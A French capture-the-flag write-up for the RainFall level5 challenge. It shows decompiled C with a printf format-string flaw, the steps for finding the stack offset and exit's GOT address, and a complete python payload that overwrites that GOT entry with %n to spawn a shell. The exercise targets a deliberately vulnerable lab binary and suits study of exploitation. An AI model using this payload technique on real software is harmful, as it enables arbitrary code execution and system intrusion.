Here is the decompiled code :

```c
void o(void)

{
  system("/bin/sh");
                    /* WARNING: Subroutine does not return */
  _exit(1);
}

void n(void)

{
  char local_20c [520];

  fgets(local_20c,0x200,stdin);
  printf(local_20c);
                    /* WARNING: Subroutine does not return */
  exit(1);
}

void main(void)

{
  n();
  return;
}
```

On voit une fonction n() qui utilise printf avec la meme vulnerabilite que les 2 exercices precedents et une fonction o() qui spawn un shell. 

On va faire en sorte d'executer la fonction o() au moment du printf non protege pour spawn le shell.

On retrouve la position du buffer grace aux %x,
```
level5@RainFall:~$ ./level5 
aaaa %X %X %X %X %X %X %X %X
aaaa 200 B7FD1AC0 B7FF37D0 61616161 20582520 25205825 58252058 20582520
```

Il est en 4eme position.

L'adresse de o() est 0x080484a4.

On a nos elements pour exploiter la faille et spawn un shell.
On peut voir que la fonction n() utilise exit(), et grace a printf, on va modifier l'adresse d'exit pour atteindre la fonction o().

```
level5@RainFall:~$ objdump -R level5 | grep "exit"
08049838 R_386_JUMP_SLOT   exit
```

L'adresse est donc 0x08049838.

Le payload va ressembler a ca :
[ addr exit() ] + [ valeur de l'addr o() - 4 bytes de l'addr d'exit() ]

`(python -c 'print("\x38\x98\x04\x08%134513824d%4$n")'; cat) | ./level5`

Ressource : https://axcheron.github.io/exploit-101-format-strings/#code-execution-redirect
